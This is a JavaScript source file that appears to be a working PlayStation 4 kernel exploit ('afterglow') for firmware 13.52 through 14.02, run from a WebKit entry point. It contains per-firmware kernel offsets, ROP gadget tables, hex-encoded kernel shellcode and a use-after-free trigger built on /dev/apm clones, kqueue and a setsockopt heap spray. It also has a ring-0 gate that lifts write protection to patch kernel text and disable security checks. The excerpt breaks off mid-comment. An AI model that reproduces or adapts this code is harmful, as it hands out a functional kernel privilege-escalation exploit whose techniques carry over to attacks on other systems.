/*
    afterglow -- PlayStation 4 kernel exploit for firmware 14.00
    Port to the raw13 host (WebKit entry), from the Lua original.

    Copyright (C) 2026 well0nez

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as
    published by the Free Software Foundation, either version 3 of the
    License, or (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

    Ported from the Lua original, which ran inside a game process. This
    file runs from WebKit, where the heap is groomed by someone else and the
    page can go away mid-chain -- see the handle teardown at the bottom.
    probeAfterglow() answers whether a given process can carry the exploit
    at all; it fires nothing and patches nothing.

    What the host must provide, and raw13 does:
      sc(num, ...args)      syscall, returns {lo, hi, i32}
      bufAddr(arrayBuffer)  int64 address of the backing store
      p.read1/4/8           read in this process
      p.write1/4/8          write in this process
      p.readInto(u8, at, n)
      keepAlive             array, so our buffers survive the collector
      mark(tag, detail)     log
    A way to call native code is NOT needed.
*/

import { int64 } from "./int64.js";

const S = {
  open: 5, close: 6, ioctl: 54, mprotect: 74, socket: 97, setsockopt: 105,
  getuid: 24, kqueue: 362, kevent: 363, mmap: 477, thr_self: 432,
  getpid: 20, sysctl: 202, cpuset_getaffinity: 487,
  cpuset_setaffinity: 488, dynlib_get_list: 592, dynlib_get_info: 593,
};

/* Offsets into the kernel image, one table per firmware. Everything that
   moved between 13.52 and 14.00 lives here; everything that did not is
   written once. The 13.52 column was derived from the two kernel images
   offline and cross-checked against a second method per value. */
const FIRMWARE = {
  "14.00": {
    anchor:    0x00e6c60,   /* the lock the leak hands us */
    swap_rbp:  0x0a80f68,   /* xchg rbp,rax ; ret */
    prison0:   0x111fa18,   /* holds a pointer to prison0, so read it */
    rootvnode: 0x2136e90,
    padding:   0x0b39d98,   /* start of the zero run behind kernel text */
    ghKmem:    0x0466540,
  },
  "13.52": {
    anchor:    0x00e6c60,   /* same function, same place */
    swap_rbp:  0x0a80c98,   /* 4e 95 c3, the only match in text */
    prison0:   0x111fa18,   /* same, decoded from the same instruction */
    rootvnode: 0x2136e90,
    padding:   0x0b39ad8,
    ghKmem:    0x0466290,
  },
};

/* 14.02. Every value below was measured, not carried over:

   anchor    0x00e6c30 -- the lock the leak hands back. A console reading put
             it at 0xc8aa6c30, i.e. 0x2c30 on the 16 KiB grid of the kernel
             base, which is 0x30 below 14.00's 0xe6c60. It is also the only
             value of the five that a leak can confirm by itself: the base it
             derives has to land on the 16 KiB grid.
   swap_rbp  0x0a81478 -- `4e 95 c3` (xchg rbp,rax ; ret) occurs exactly once
             in the whole 13.6 MB text image, here. 14.00's 0x0a80f68 holds
             high-entropy data on this build, so a pivot through it would load
             a stack pointer out of garbage.
   prison0   0x111fa18 -- unchanged. SYSENT and the other data symbols did not
             move either: the four data deltas measured across the two versions
             are all 0x0.
   rootvnode 0x2136e90 -- unchanged, same reason. The kernel reads this one
             through the kernel base, so a stale value is a read of unmapped
             memory and a panic.
   padding   0x0b3a4c0 -- start of the zero run behind kernel text. It is not
             14.00's 0xb39d98: on 14.02 that address holds 0x30, the middle of
             an .eh_frame entry, and the teardown stub written there would
             corrupt it. The run is 0xbe3600 - 0xb3a4c0 bytes and both ends
             cross-check against values this file already trusts -- GoldHEN's
             rvaPad 0xb3c000 sits inside it, and the RW window 0xb3c000..
             0xbe35d8 ends 0x28 before the run does. */
FIRMWARE["14.02"] = Object.assign({}, FIRMWARE["14.00"], {
  anchor:    0x00e6c30,
  swap_rbp:  0x0a81478,
  prison0:   0x111fa18,
  rootvnode: 0x2136e90,
  padding:   0x0b3a4c0,
});

let K = null;

/* offsets into libSceLibcInternal, with the bytes that must be found there */
const GADGETS = {
  pivot:  [0x0d2812, "488b67385fc3"],   /* mov rsp,[rdi+0x38] ; pop rdi ; ret */
  rdi:    [0x0a6bae, "5fc3"],
  rsi:    [0x095560, "5ec3"],
  rdx:    [0x04e6d2, "5ac3"],
  rcx:    [0x0943ee, "59c3"],
  store:  [0x041ceb, "488907c3"],       /* mov [rdi],rax ; ret */
  load:   [0x0120b1, "488b07c3"],       /* mov rax,[rdi] ; ret */
  load8:  [0x057fae, "488b4008c3"],     /* mov rax,[rax+8] ; ret */
  add:    [0x0aaf8b, "4801f8c3"],
  sub:    [0x0275b4, "4829f8c3"],
  shr:    [0x0a9ba2, "48d3e8c3"],
  shl:    [0x0a9b98, "48d3e0c3"],
  memcpy: [0x026ad0, "554889e54889f8"],
  leave:  [0x09e59d, "c9c3"],
};

/* the read only tail of the libc text segment: executable already, claimed by
   no ELF header. An anonymous page stays non executable on this firmware
   however the mapping is widened, which is why this room is used at all. */
const HOST = { page: 0x130000, free: 0x130730, last: 0x131000 };

const TUNE = {
  sprays: 126,   /* a hard floor, one short of it never lands */
  object: 104,   /* sprayed object, falls into the 128 byte zone */
  window: 0x4000,
  entries: 420,
  stride: 0x90,
  seed: 10,
  spare: 8,
  batch: 60,     /* setsockopt per rop entry */
  ceiling: 255,  /* how far up to look for a free unit */
};

/* any cdev will do: the exploit only needs a file whose operation table sits
   in kernel text. Deliberately not a socket -- the spray needs all 126 of
   those, and one short of that never lands in the right bucket. */
const PROBE_NODES = ["/dev/rng", "/dev/urandom", "/dev/random", "/dev/zero", "/dev/null"];

/* The bootstrap carries its kernel addresses inside the machine code, so it
   is one blob per firmware. Between 13.52 and 14.00 exactly two of its ten
   write targets moved -- the two 0x33 -> 0x37 immediates. */
const BOOTSTRAP_TABLE = {
  "14.00":
      "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
    + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
    + "20c0480d000001000f22c031c0c3",
  /* 14.02. Same shape as 14.00, three differences, all forced by the image:
       - the two 0x37 immediates are at 0x1faeda/0x1faedd, not 0x1faada/
         0x1faadd. The dump differs from the post-patch image on exactly those
         two bytes: 33 -> 37, one per immediate. +0x400.
       - the `jmp [rsi]` thunk is written as a WORD. 14.00's blob encodes it as
         a dword (`c7 81 ... ff 26 48 8d`, borrowing two bytes from the next
         instruction) which would also overwrite 0xab6..0xab7. The 14.02 image
         still holds 90 90 there, so the real chain wrote two bytes, not four.
       - the byte writes are `c6 81` with the displacement spelled out; 14.00's
         short form is unchanged in meaning.
     Everything else -- the five forced branches, the 0x490 zeroing, the three
     sysent words -- is at the same RVA, because XFAST_SYSCALL (0x1c0) and
     SYSENT (0x1102b70) are the same on both versions. The blob decodes
     linearly to exactly 142 bytes and ends in ret. */
  "14.02":
      "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0c7"
    + "81900400000000000066c781b5040000eb0066c781b9040000eb00c681c2040000eb66c7"
    + "81b40a0000ff26488d91b40a0000c781802d100102000000488991882d1001c781ac2d10"
    + "0101000000c681daae1f0037c681ddae1f00370f20c0480d000001000f22c031c0c3",
  "13.52":
      "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
    + "488991882d1001c781ac2d100101000000c6813aa81f0037c6813da81f00370f"
    + "20c0480d000001000f22c031c0c3",
};

let BOOTSTRAP = null;

/* Pick the tables for a firmware. Returns false for one we have no kernel
   stage for -- the caller must not go on, because every address below is
   then simply wrong. */
let FW_KEY = "";

/* Where 14.02 kernel support actually lives. This is upstream's commit --
   the one that added the 14.02 table, AES pair included -- and it is quoted
   verbatim in the refusal below so a tester who picked GoldHEN has somewhere
   to go instead of a dead end. */
const UPSTREAM_1402 =
  "https://github.com/Scene-Collective/ps4-hen/commit/"
  + "8c62f6628827055df0dfece1c4d14e045761288b";

function setFirmware(fw, opts) {
  const f = FIRMWARE[fw];
  if (!f) return false;
  /* A probe opens nodes, arms a queue and sprays sockets; it never frees a
     clone and never writes a kernel address. That is the only case where a
     firmware with no patch set and no bootstrap may be selected. */
  const probeOnly = !!(opts && opts.probeOnly);
  if (!probeOnly && (!PATCH_TABLE[fw] || !BOOTSTRAP_TABLE[fw])) return false;
  /* An explicit anchor lets the constant be tested against a firmware whose
     real value is unknown: derive the base from the leak, and if it lands on
     the 16 KiB grid the anchor was right. Nothing is written either way. */
  K = (opts && typeof opts.anchor === "number" && opts.anchor > 0)
    ? Object.assign({}, f, { anchor: opts.anchor })
    : f;
  PADDING = f.padding;
  PATCHES = probeOnly ? (PATCH_TABLE[fw] || []) : PATCH_TABLE[fw];
  BOOTSTRAP = probeOnly ? (BOOTSTRAP_TABLE[fw] || null) : BOOTSTRAP_TABLE[fw];
  GH.rvaKmem = f.ghKmem;
  FW_KEY = fw;
  return true;
}

const PATCH_TABLE = {
  "14.00": [
  [0x0000acd, "eb",       "bcopy"],
  [0x02bd79d, "eb",       "bzero"],
  [0x02bd7e1, "eb",       "pagezero"],
  [0x02bd85d, "eb",       "memcpy"],
  [0x02bd8a1, "eb",       "pagecopy"],
  [0x02bda4d, "eb",       "copyin"],
  [0x02bdefd, "eb",       "copyinstr"],
  [0x02bdfcd, "eb",       "copystr"],
  [0x01b7a43, "eb04",     "dlsym, first check"],
  [0x01b7a53, "eb04",     "dlsym, second check"],
  [0x01b7a73, "90e9",     "dlsym, nop and jump"],
  [0x01b7504, "90e9",     "load_prx"],
  [0x01b7ab8, "90e93c01", "dlsym, open it to every caller"],
  [0x0628684, "eb00",     "self verification"],
  [0x0628f6f, "eb00",     "delayed panic on suspend"],
  ],
  /* 14.02. Fourteen of these sit at the same RVA as 14.00; the last one moved
     by +0x300. Do not apply a uniform shift to the table -- the versions moved
     by five different deltas (0x0, 0x300, 0x370, 0x3f0, 0x480) and one shift
     fits at most seven of the seventeen sites. At the shifted addresses the
     image holds ordinary instructions, not patch sites, so a shifted table
     patches nothing real and leaves every real site armed.

     Verified against the two ends of the same 14.02 build: a clean pre-patch
     kernel image (1402k.elf, SDK build, non-zero data) and a 13,624,576-byte
     kernel text image taken from a console after the chain ran. Applying this
     table to the clean image reproduces the console image byte for byte at all
     15 rows. Across the whole 0xcfe880 text span only 237 bytes differ, in 42
     runs, and every one of them is accounted for: these 15 rows, seven writes
     the bootstrap blob makes (0x490, 0x4b5, 0x4b9, 0x4c2, 0xab4, 0x1faeda,
     0x1faedd), three later hook trampolines (0x3b3300, 0x3b3830, 0xb3a400),
     four loader-filled pointer tables at 0xb3a410..0xb3a4bf, and thirteen
     two-byte ASLR fixups in the first page. Nothing else moved. */
  "14.02": [
  [0x0000acd, "eb",       "bcopy"],
  [0x02bd79d, "eb",       "bzero"],
  [0x02bd7e1, "eb",       "pagezero"],
  [0x02bd85d, "eb",       "memcpy"],
  [0x02bd8a1, "eb",       "pagecopy"],
  [0x02bda4d, "eb",       "copyin"],
  [0x02bdefd, "eb",       "copyinstr"],
  [0x02bdfcd, "eb",       "copystr"],
  [0x01b7a43, "eb04",     "dlsym, first check"],
  [0x01b7a53, "eb04",     "dlsym, second check"],
  [0x01b7a73, "90e9",     "dlsym, nop and jump"],
  [0x01b7504, "90e9",     "load_prx"],
  [0x01b7ab8, "90e93c01", "dlsym, open it to every caller"],
  [0x0628684, "eb00",     "self verification"],
  [0x062926f, "eb00",     "delayed panic on suspend"],
  ],
  "13.52": [
  [0x0000acd, "eb",       "bcopy"],
  [0x02bd4ed, "eb",       "bzero"],
  [0x02bd531, "eb",       "pagezero"],
  [0x02bd5ad, "eb",       "memcpy"],
  [0x02bd5f1, "eb",       "pagecopy"],
  [0x02bd79d, "eb",       "copyin"],
  [0x02bdc4d, "eb",       "copyinstr"],
  [0x02bdd1d, "eb",       "copystr"],
  [0x01b77a3, "eb04",     "dlsym, first check"],
  [0x01b77b3, "eb04",     "dlsym, second check"],
  [0x01b77d3, "90e9",     "dlsym, nop and jump"],
  [0x01b7264, "90e9",     "load_prx"],
  [0x01b7818, "90e93c01", "dlsym, open it to every caller"],
  [0x06283c4, "eb00",     "self verification"],
  [0x0628caf, "eb00",     "delayed panic on suspend"],
  ],
};

let PATCHES = null;

/* ------------------------------------------------------------- the host */

const STATE = { ctx: null, units: {}, clones: 0, base: null, stubs: {}, batch: undefined, retry: false };

function host() {
  if (!STATE.ctx) throw new Error("afterglow: no host installed");
  return STATE.ctx;
}

/* Every line this module prints is also kept, so a run can hand its whole log
   back to the server instead of being photographed off a 1080p television at
   a resolution no one can read. */
const LOGLINES = [];
function say(fmt) {
  try { LOGLINES.push(String(fmt)); } catch (e) {}
  if (LOGLINES.length > 4000) LOGLINES.shift();
  host().mark("AG", fmt);
}

/* Hand the log to the server right now, not at the end of the run. A kernel
   fault does not return, so anything still buffered in the page is lost -- the
   last line that reached the disk is the last thing that actually happened. */
function postLogNow() {
  try {
    if (typeof fetch === "function")
      fetch("log", { method: "POST", body: LOGLINES.join("\n") });
  } catch (e) {}
}

const LOW = 0x100000000;

function v(low, hi) { return new int64(low >>> 0, (hi || 0) >>> 0); }
function plus(a, n) { return n < 0 ? a.sub32(-n) : a.add32(n); }
function same(a, b) { return !!b && a.low === b.low && a.hi === b.hi; }
function inText(a) { return a.hi >= 0xffffff00 && a.low !== 0; }
function inHeap(a) { return a.hi >= 0xffff0000 && a.hi < 0xffffff00 && a.low !== 0; }
function text(a) { return "0x" + a.toString(16).padStart(16, "0"); }
function hex32(v) { return "0x" + (v >>> 0).toString(16).padStart(8, "0"); }

/* The host resolves a syscall number to a libkernel stub and only ever
   scanned for its own two dozen. Ours -- open, mprotect, kqueue, kevent,
   ioctl, the dynlib pair -- are not among them, and an unresolved number
   reaches its argument marshalling as undefined. So we scan for the rest
   ourselves, with the same shape it looks for:

       48 c7 c0 <nr32>   49 89 ca   0f 05

   One pass for everything missing, not one pass per number. */
function seedStubs() {
  const c = host();
  const need = new Set();
  for (const k in S) {
    const n = S[k];
    if (!(c.stubAddr && c.stubAddr.has(n)) && !STATE.stubs[n]) need.add(n);
  }
  if (!need.size) return [];

  const base = c.libkernelBase;
  if (!base) return Array.from(need);

  const limit = (c.off && c.off.k_scan_stage1) || 0x200000;
  for (let o = 0; o < limit && need.size; o += 16) {
    const q = c.p.read8(base.add32(o));
    if ((q.low & 0x00ffffff) !== 0xc0c748 || (q.hi >>> 24) !== 0x49) continue;
    const n = ((q.low >>> 24) | ((q.hi & 0x00ffffff) << 8)) >>> 0;
    if (!need.has(n)) continue;
    STATE.stubs[n] = base.add32(o);
    need.delete(n);
  }
  return Array.from(need);
}

function stubFor(num) {
  const c = host();
  if (STATE.stubs[num]) return STATE.stubs[num];
  if (c.stubAddr && c.stubAddr.has(num)) return c.stubAddr.get(num);
  return null;
}

function sc(num) {
  const a = Array.prototype.slice.call(arguments, 1);
  const t = stubFor(num);
  if (!t) throw new Error("afterglow: no libkernel stub for syscall " + num);
  return host().callAddr(t, a);
}

function alloc(size) {
  const c = host();
  const ab = new ArrayBuffer(size);
  const u8 = new Uint8Array(ab);
  const dv = new DataView(ab);
  c.keepAlive.push(ab, u8, dv);
  return { ab: ab, u8: u8, dv: dv, at: c.bufAddr(ab) };
}

function rd4(at) { return host().p.read4(at) >>> 0; }
function rd8(at) { const r = host().p.read8(at); return v(r.low, r.hi); }
function wr1(at, b) { host().p.write1(at, b & 0xff); }
function wr4(at, n) { host().p.write4(at, n >>> 0); }
function wr8(at, q) { host().p.write8(at, q); }

/* p carries read1/2/4/8 and write1/2/4/8 and nothing bulk, so this walks it
   a quadword at a time and picks up the remainder by byte. */
function rdbuf(at, len) {
  const out = new Uint8Array(len);
  const pr = host().p;
  let i = 0;
  while (i + 8 <= len) {
    const q = pr.read8(plus(at, i));
    let lo = q.low >>> 0, hi = q.hi >>> 0;
    for (let k = 0; k < 4; k++) { out[i + k] = lo & 0xff; lo = lo >>> 8; }
    for (let k = 0; k < 4; k++) { out[i + 4 + k] = hi & 0xff; hi = hi >>> 8; }
    i += 8;
  }
  while (i < len) { out[i] = pr.read1(plus(at, i)) & 0xff; i++; }
  return out;
}

function wrbuf(at, bytes) {
  for (let i = 0; i < bytes.length; i++) wr1(plus(at, i), bytes[i]);
}

function unhex(s) {
  const out = new Uint8Array(s.length / 2);
  for (let i = 0; i < out.length; i++) out[i] = parseInt(s.substr(i * 2, 2), 16);
  return out;
}

function sameBytes(a, b) {
  if (a.length !== b.length) return false;
  for (let i = 0; i < a.length; i++) if (a[i] !== b[i]) return false;
  return true;
}

/* 64 bit quantity into a buffer, and back */
function pokeAt(buf, off, q) {
  buf.dv.setUint32(off, q.low >>> 0, true);
  buf.dv.setUint32(off + 4, q.hi >>> 0, true);
}


function wipe(buf, len) { buf.u8.fill(0, 0, len); }

function cstr(s) {
  const b = alloc(s.length + 8);
  for (let i = 0; i < s.length; i++) b.u8[i] = s.charCodeAt(i);
  b.u8[s.length] = 0;
  return b;
}

function splitNum(n) { return v(n % LOW, Math.floor(n / LOW)); }
function asQ(x) { return (typeof x === "number") ? splitNum(x) : x; }

/* ------------------------------------------------- machine code pad */

function codeAt(pageAt, off) {
  return {
    at: plus(pageAt, off),
    n: 0,
    reset: function () { this.n = 0; return this; },
    byte: function (b) { wr1(plus(this.at, this.n), b); this.n++; return this; },
    hex: function (s) {
      const b = unhex(s);
      for (let i = 0; i < b.length; i++) this.byte(b[i]);
      return this;
    },
    dw: function (n) {
      for (let k = 0; k < 4; k++) this.byte(Math.floor(n / Math.pow(256, k)) % 256);
      return this;
    },
    qw: function (q) { return this.dw(q.low >>> 0).dw(q.hi >>> 0); },
    imm: function (bytes) {
      for (let i = 0; i < bytes.length; i++) this.byte(bytes[i]);
      return this;
    },
  };
}

/* ------------------------------------------------------- rop chain */

function makeChain(buf, gad) {
  return {
    buf: buf, base: buf.at, n: 0, fix: [], g: gad,

    slot: function (q) { pokeAt(this.buf, this.n * 8, asQ(q)); this.n++; return this.n - 1; },
    num: function (n) { return this.slot(asQ(n)); },
    hole: function () { return this.slot(v(0, 0)); },
    where: function (i) { return plus(this.base, i * 8); },
    gad: function (name) { return this.slot(this.g[name]); },
    point: function (hole, target) { this.fix.push([hole, target]); },

    seal: function () {
      for (let i = 0; i < this.fix.length; i++) {
        pokeAt(this.buf, this.fix[i][0] * 8, this.where(this.fix[i][1]));
      }
      this.gad("leave");
    },

    rdi: function (n) { this.gad("rdi"); return this.num(n); },
    rsi: function (n) { this.gad("rsi"); return this.num(n); },
    rdx: function (n) { this.gad("rdx"); return this.num(n); },

    /* rax <- *(rax + off), through the one deref gadget there is */
    follow: function (off) {
      const d = off - 8;
      if (d >= 0) { this.rdi(d); this.gad("add"); } else { this.rdi(-d); this.gad("sub"); }
      this.gad("load8");
    },

    save_rax: function (at) { this.rdi(at); this.gad("store"); },
    load_rax: function (at) { this.rdi(at); this.gad("load"); },

    /* copy len bytes from wherever rax points to dst, and report the slot
       that ends up holding the source address */
    grab: function (dst, len) {
      this.gad("rdi"); const h = this.hole();
      this.gad("store");
      this.gad("rsi"); const s = this.hole();
      this.point(h, s);
      this.rdx(len); this.rdi(dst); this.gad("memcpy");
      return s;
    },

    put: function (dst, src, len) {
      this.gad("rdi"); this.slot(dst);
      this.rsi(src); this.rdx(len); this.gad("memcpy");
    },
  };
}

/* ----------------------------------------------------------- a shot */

/* One attempt at the bug. Each takes a unit nobody used before: a unit an
   earlier attempt touched still carries a note from that attempt's queue, and
   freeing its clone again would leave a foreign queue pointing at dead
   memory. */
function shooter(gad) {
  const s = {
    g: gad, fired: 0, sprayed: 0, devs: [], queues: [],
    /* A read-only leak has no use for the "this unit was already used" note:
       the note exists so a second write does not free a clone a foreign queue
       still points at, and nothing here writes. Without this the probe's own
       twenty held clones occupy 0..19, the search skips all of them, and it
       walks up into unit numbers that were never created. */
    ignoreSpent: false,
    sockaddr: alloc(16),
  };
  const bs = [16, 2, 0x04, 0xD2, 0x0a, 0, 0, 1];
  for (let i = 0; i < bs.length; i++) s.sockaddr.u8[i] = bs[i];

  s.hold = function (path) {
    const fd = sc(S.open, cstr(path).at, 0).i32;
    if (fd >= 0) this.devs.push(fd);
    return fd;
  };

  /* A read-only run takes many shots and every shot primes its own clones.
     Holding all of them exhausts the descriptor table long before the last
     attempt, and a refused open reads exactly like a failed reclaim. Between
     read attempts nothing depends on them: take() primes from scratch. */
  s.drop = function () {
    /* Close kqueues FIRST - they hold pending events on the freed object.
       Then close /dev/apm clones. Order matters or the kernel panics. */
    for (let i = 0; i < this.queues.length; i++) {
      try { sc(S.close, this.queues[i]); } catch (e) {}
    }
    this.queues.length = 0;
    for (let i = 0; i < this.devs.length; i++) {
      try { sc(S.close, this.devs[i]); } catch (e) {}
    }
    this.devs.length = 0;
  };

  s.take = function (build, room) {
    /* four ways to come back empty, and telling them apart matters: one is a
       spent budget, one is a refused open, one is a kernel that would not
       arm. A bare null names none of them. */
    this.why = null;
    if (this.hold("/dev/apm") < 0) {
      this.why = "the clone node refused to open, errno " + host().errno();
      return null;
    }

    /* The ceiling used to be 15. By the second shot this process is
       already holding some fifty clones of its own, so the free numbers sit
       above that -- and a search that stops at fifteen finds nothing while
       reporting "no unused unit", which is true and useless. Look further,
       and write down why the refusals came. */
    let unit = -1, watched = -1;
    const refused = [];
    /* In a read-only leak the numbered units may not exist yet: the probe
       opened its twenty clones, then closed every /dev/apmN it found, so the
       numbering collapsed back to nothing and the search walked 63..0 through
       sixty-four ENOENTs while the exploit sat waiting. Clones are created by
       opening /dev/apm, so make some first and the numbering exists again.
       The write path keeps its old order -- this only runs for a leak. */
    if (this.ignoreSpent) {
      this.primed = 0; this.primeErr = 0;
      for (let i = 0; i < TUNE.seed; i++) {
        if (this.hold("/dev/apm") < 0) { this.primeErr = host().errno(); break; }
        this.primed++;
      }
    }
    for (let u = 0; u <= TUNE.ceiling; u++) {
      if (!this.ignoreSpent && STATE.units[u]) continue;
      const fd = this.hold("/dev/apm" + u);
      if (fd >= 0) { unit = u; watched = fd; break; }
      if (refused.length < 4) refused.push(u + ":e" + host().errno());
    }
    if (unit < 0) {
      this.why = "no apm unit among 0.." + TUNE.ceiling
                 + " (" + Object.keys(STATE.units).length + " spent, refusals "
                 + refused.join(" ") + ")";
      return null;
    }
    STATE.units[unit] = true;
    this.fired++;

    const doomed = sc(S.open, cstr("/dev/apm" + unit).at, 0).i32;
    if (doomed < 0) {
      this.why = "second open of /dev/apm" + unit + " refused, errno " + host().errno();
      return null;
    }

    const q = sc(S.kqueue).i32;
    this.queues.push(q);
    const ev = alloc(32);
    const arm = function () {
      ev.dv.setUint32(0, watched >>> 0, true);
      ev.dv.setUint32(4, 0, true);
      ev.dv.setUint16(8, 0xFFFF, true);
      ev.dv.setUint16(10, 0x0001, true);
      ev.dv.setUint32(12, 0, true);
      ev.u8.fill(0, 16, 32);
      return sc(S.kevent, q, ev.at, 1, 0, 0, 0).i32;
    };
    const armed = arm();
    if (armed !== 0) {
      this.why = "kevent would not arm on unit " + unit + ", rv=" + armed
                 + " errno " + host().errno();
      return null;
    }

    /* Everything that is not a 128 byte allocation happens before the free.
       Anything in between lets a foreign consumer take the hole first. */
    const rop = alloc(room || 0x400);
    const frame = alloc(0x100);
    wipe(frame, 0x100);
    const c = makeChain(rop, this.g);
    c.num(0);                      /* swallowed by the pop in the pivot gadget */
    build(c);
    c.seal();
    pokeAt(frame, 0x38, rop.at);

    const body = alloc(TUNE.object);
    wipe(body, TUNE.object);
    pokeAt(body, 0x38, this.g.pivot);
    pokeAt(body, 0x58, frame.at);

    /* kept for the leak-only report. The body is what the kernel copies into
       the freed 128 byte zone, so a pointer out of it turning up in the window
       is proof that the reclaim landed rather than hope that it did. */
    this.bodyAt = body.at;
    this.frameAt = frame.at;
    this.pivotAt = this.g.pivot;

    const req = alloc(40);
    req.dv.setUint32(0, 1, true);
    req.dv.setUint32(4, 0, true);
    pokeAt(req, 8, this.sockaddr.at);
    req.dv.setUint32(16, 16, true);
    pokeAt(req, 24, body.at);
    req.dv.setUint32(32, TUNE.object, true);

    /* The original tapered this to TUNE.spare once sixty clones were out --
       a saving that suits a quiet game process. Here the three failures that
       reached this far all sat on a shot that had seeded eight. Seeding
       happens before the free, so it costs nothing in the window that
       decides the outcome. */
    const want = TUNE.seed;
    for (let i = 0; i < want; i++) {
      if (this.hold("/dev/apm") < 0) break;
      STATE.clones++;
    }

    const socks = [];
    for (let i = 0; i < TUNE.sprays; i++) {
      const fd = sc(S.socket, 2, 2, 0).i32;
      if (fd < 0) break;
      socks.push(fd);
    }

    /* The window: from the free to the last spray. In the Lua host each of
       these is a cheap syscall; here every one is a ROP call -- lay out a
       stack, bend a pivot cell, trip Math.expm1, put the cell back. Nothing
       may be printed inside it, so the number is only reported afterwards. */
    const hh = host();
    const stub = stubFor(S.setsockopt);
    /* One entry per batch instead of one per socket. One entry per socket
       was measured at 119 us, so 126 of them held the hole open for 15 ms;
       batched it is 0 to 1 ms, which is where the Lua host already was.
       Batches are sized to the host's rop stack (0x2000) -- twelve slots a
       call, and room for the epilogue. */
    /* How many fit in one entry is a property of the host's rop stack, not
       of this console's speed -- a slower machine wants the same answer, just
       fewer entries would help it more. The stack size is the host's own
       constant, so ask instead of assuming: build the largest batch it
       accepts, once, outside the window. */
    if (STATE.batch === undefined && hh.prepareMany && stub) {
      STATE.batch = 0;
      for (let n = TUNE.sprays; n >= 8; n = Math.floor(n * 3 / 4)) {
        try {
          const probeCalls = [];
          for (let i = 0; i < n; i++) probeCalls.push([stub, [0, 17, 128, req.at, 40]]);
          hh.prepareMany(probeCalls);
          STATE.batch = n; break;
        } catch (e) { /* too big for its stack, try smaller */ }
      }
      say("    rop stack takes " + STATE.batch + " calls per entry");
    }
    const batch = (hh.prepareMany && hh.runPrepared && stub) ? (STATE.batch || 0) : 0;
    const prepared = [];
    if (batch) {
      const calls = [];
      for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
      for (let i = 0; i < calls.length; i += batch) {
        prepared.push(hh.prepareMany(calls.slice(i, i + batch)));
      }
      /* warm the path: the first entry of a run paid 19 ms where the rest
         paid 4, and that difference has no business being inside the window */
      hh.runPrepared(hh.prepareMany([[stubFor(S.getuid), []]]));
    }

    const t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
    sc(S.close, doomed);
    if (batch) {
      for (let i = 0; i < prepared.length; i++) hh.runPrepared(prepared[i]);
    } else {
      for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
    }
    const t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
    this.window = t1 - t0;
    this.batched = batch;
    /* should the hole have stayed empty, a fresh clone drops a real pointer
       in, which makes the second arm() merely useless instead of fatal */
    for (let i = 0; i < TUNE.spare; i++) this.hold("/dev/apm");

    this.sprayed = socks.length;
    const r = arm();
    for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
    say("    window " + this.window.toFixed(2) + " ms for " + socks.length
        + " setsockopt in " + (this.batched ? prepared.length : socks.length) + " entries");
    return r;
  };

  return s;
}

function ran(r) { return r !== null && r === -1; }

function qAt(buf, off) {
  return v(buf.dv.getUint32(off, true), buf.dv.getUint32(off + 4, true));
}

/* ----------------------------------------- ring 0 through syscall 11 */

/* The bootstrap pointed sysent[11] at a planted `jmp [rsi]`. sy_call is
   entered with rdi = thread and rsi = the argument vector, so the jump lands
   on whatever address the first argument carries.

   The original issues this with the loader's native call. A host whose
   syscall primitive takes an arbitrary number could call syscall 11 straight;
   raw13's sc() goes through a per-number stub table that has no entry for 11,
   so the two byte userland stub stays and is entered with callAddr. */
const GATE = 0x0a0, BODY = 0x0c0, OUT = 0x400, FLAG = 0x420, STAGE = 0x440;
const STAGE_MAX = 0x400;
const SIGIL = 0x600D600D;

function openRing0(roomAt) {
  const r = { at: roomAt, body: codeAt(roomAt, BODY) };
  codeAt(roomAt, GATE).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");

  r.begin = function () { return this.body.reset(); };

  /* the gate returns the thread's value, not ours, so the body raises a flag
     of its own as its very last act and that is what we test */
  r.run = function () {
    this.body.hex("48b8").qw(plus(this.at, FLAG)).hex("c700").dw(SIGIL).hex("31c0").hex("c3");
    wr4(plus(this.at, FLAG), 0);
    host().callAddr(plus(this.at, GATE), [11, plus(this.at, BODY)]);
    return (rd4(plus(this.at, FLAG)) >>> 0) === (SIGIL >>> 0);
  };

  r.out = function () { return rd8(plus(this.at, OUT)); };

  r.thread = function () {
    this.begin().hex("48ba").qw(plus(this.at, OUT)).hex("48893a");
    return this.run() ? this.out() : null;
  };

  r.base = function () {
    const c = this.begin();
    c.hex("b9").dw(0xc0000082).hex("0f32");
    c.hex("48c1e220").hex("89c0").hex("4809c2");
    c.hex("48b8").qw(plus(this.at, OUT)).hex("488910");
    return this.run() ? plus(this.out(), -0x1c0) : null;
  };

  /* rep movsb inside the write protection bracket, so the same primitive
     serves kernel data and kernel text. Only writes need the bracket, and
     every clear of it is a window in which this thread must not be
     interrupted -- so reads do not open one. */
  r.copy = function (dst, src, len, guarded) {
    const c = this.begin();
    if (guarded) c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
    c.hex("48bf").qw(dst);
    c.hex("48be").qw(src);
    c.hex("48b9").qw(splitNum(len));
    c.hex("fc").hex("f3a4");
    if (guarded) c.hex("0f20c0").hex("480d").dw(0x00010000).hex("0f22c0");
    return this.run();
  };

  /* All of them in one entry, with the write protection lifted once. Several
     of these sit in the hottest routines in the kernel and the other cores
     keep running them; a patch written in its own call is a window in which
